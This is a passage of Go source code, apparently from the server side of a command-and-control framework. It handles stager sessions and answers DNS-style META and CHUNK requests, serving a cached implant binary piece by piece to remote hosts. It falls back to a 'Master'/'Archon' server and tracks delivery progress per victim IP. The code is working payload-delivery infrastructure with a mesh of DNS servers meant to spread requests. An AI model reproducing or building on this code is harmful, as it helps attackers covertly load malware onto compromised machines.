				StartedAt:      time.Now(),
				LastActivity:   time.Now(),
			}
			c2.stagerMutex.Unlock()

			logf("[Stager] Using cached binary %s (%d chunks) for session %s", clientBinaryID, totalChunks, sessionID)

			// Notify Master about stager contact (async, don't wait)
			if masterClient != nil {
				go masterClient.NotifyStagerContact(stagerIP, osType, arch, clientBinaryID, totalChunks)
			}

			return fmt.Sprintf("META|%s|%d", sessionID, totalChunks), true, false
		}

		// No local cache - fall back to Master
		if masterClient != nil {
			sessionInfo, err := masterClient.InitStagerSession(stagerIP, osType, arch)
			if err != nil {
				logf("[Stager] Failed to init session with Archon: %v", err)
				return "", false, true
			}

			// Store session locally for chunk tracking
			c2.stagerMutex.Lock()
			c2.stagerSessions[stagerIP] = &StagerSession{
				ClientIP:       stagerIP,
				SessionID:      sessionInfo.SessionID,
				OS:             osType,
				Arch:           arch,
				TotalChunks:    sessionInfo.TotalChunks,
				DeliveredCount: 0,
				StartedAt:      time.Now(),
				LastActivity:   time.Now(),
			}
			c2.stagerMutex.Unlock()

			return fmt.Sprintf("META|%s|%d", sessionInfo.SessionID, sessionInfo.TotalChunks), true, false
		}

		logf("[Stager] No cached chunks and no Archon connection")
		return "NO_CACHE", false, false

	case "CHUNK":
		// CHUNK|chunk_index|IP|session_id|timestamp - Request for a specific chunk
		if len(msgParts) < 4 {
			return "", false, true
		}
		chunkIndex, _ := strconv.Atoi(msgParts[1])
		stagerIP := msgParts[2]
		sessionID := msgParts[3]

		if c2.debug {
			logf("[Stager] Chunk request: index=%d, session=%s, ip=%s", chunkIndex, sessionID, stagerIP)
		}

		// For stager sessions (stg_* prefix), serve from cache - no Master fallback needed
		// This supports Shadow Mesh where different DNS servers handle different requests
		// Each DNS server has the full binary cached, so we can serve any chunk locally
		if strings.HasPrefix(sessionID, "stg_") {
			// Check if we already have a session with a pinned binary ID
			c2.stagerMutex.RLock()
			existingSession, sessionExists := c2.stagerSessions[stagerIP]
			c2.stagerMutex.RUnlock()

			var clientBinaryID string
			var totalChunks int
			var hasCached bool

			if sessionExists && existingSession.SessionID == sessionID && existingSession.ClientBinaryID != "" {
				clientBinaryID = existingSession.ClientBinaryID
				totalChunks = existingSession.TotalChunks
				hasCached = true
			} else if c2.db != nil {
				clientBinaryID, totalChunks, hasCached = c2.db.GetCachedBinaryInfo()
			}
			if hasCached && totalChunks > 0 {
				chunk, found := c2.db.GetCachedStagerChunk(clientBinaryID, chunkIndex)
				if found {
					// Create/update session for tracking
					c2.stagerMutex.Lock()
					session, exists := c2.stagerSessions[stagerIP]
					if !exists || session.SessionID != sessionID {
						session = &StagerSession{
							ClientIP:       stagerIP,
							SessionID:      sessionID,
							ClientBinaryID: clientBinaryID,
							OS:             "unknown",
							Arch:           "unknown",
							TotalChunks:    totalChunks,
							DeliveredCount: 0,
							StartedAt:      time.Now(),
							LastActivity:   time.Now(),
						}
						c2.stagerSessions[stagerIP] = session
					}
					session.LastActivity = time.Now()
					session.DeliveredCount = chunkIndex + 1
					session.LastChunkDelivered = chunkIndex
					session.LastChunk = &chunkIndex // Update pointer for progress updater
					c2.stagerMutex.Unlock()

					c2.logStagerProgress(session, chunkIndex, clientIP)

					// Report progress to Master (async) - report first, every 10th, and last chunk
					// Reduced from 100 to 10 for better progress visibility with slow timing profiles
					if masterClient != nil && (chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == totalChunks-1) {
						go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
					}

					return fmt.Sprintf("CHUNK|%s", chunk), true, false
				}
				// Chunk not found but we have cache - this shouldn't happen
				logf("[Stager] ERROR: Chunk %d not found in cache for binary %s", chunkIndex, clientBinaryID)
			}
			// No cache available - stager cache not synced yet
			logf("[Stager] No cached binary available for stg_* session %s (chunk %d requested)", sessionID, chunkIndex)
			return "RETRY", false, false
		}

		// Get session info for non-stg sessions (legacy/fallback)
		c2.stagerMutex.RLock()
		session, exists := c2.stagerSessions[stagerIP]
		c2.stagerMutex.RUnlock()

		if !exists || session.SessionID != sessionID {
			logf("[Stager] Unknown session %s from %s", sessionID, stagerIP)
			return "", false, true
		}

		// Update activity
		c2.stagerMutex.Lock()
		session.LastActivity = time.Now()
		c2.stagerMutex.Unlock()

		// Try local cache first if we have a client binary ID
		if session.ClientBinaryID != "" && c2.db != nil {
			chunk, found := c2.db.GetCachedStagerChunk(session.ClientBinaryID, chunkIndex)
			if found {
				// Update progress
				c2.stagerMutex.Lock()
				session.DeliveredCount = chunkIndex + 1
				session.LastChunkDelivered = chunkIndex
				session.LastChunk = &chunkIndex // Update pointer for progress updater
				c2.stagerMutex.Unlock()

				c2.logStagerProgress(session, chunkIndex, clientIP)

				// Report progress to Master (async) - report first, every 10th, and last chunk
				if masterClient != nil && (chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == session.TotalChunks-1) {
					go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
				}

				return fmt.Sprintf("CHUNK|%s", chunk), true, false
			}
		}

		// Fall back to Master for chunk
		if masterClient != nil {
			chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
			if err != nil {
				logf("[Stager] Failed to get chunk %d: %v", chunkIndex, err)
				return "", false, true
			}

			// Update progress
			c2.stagerMutex.Lock()
			session.DeliveredCount = chunkIndex + 1
			session.LastChunkDelivered = chunkIndex
			session.LastChunk = &chunkIndex // Update pointer for progress updater
			totalChunks := session.TotalChunks
			c2.stagerMutex.Unlock()

			c2.logStagerProgress(session, chunkIndex, clientIP)

			// Report progress to Master (async) - report first, every 10th, and last chunk
			if chunkIndex == 0 || chunkIndex%10 == 0 || chunkIndex == totalChunks-1 {
				go masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
			}

			return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData), true, false
		}

		logf("[Stager] No cached chunk and no Master connection")
		return "", false, true

	default:
		if c2.debug {
			logf("[C2] Unknown message type: %s", msgType)
		}
		return "", false, true
	}
}
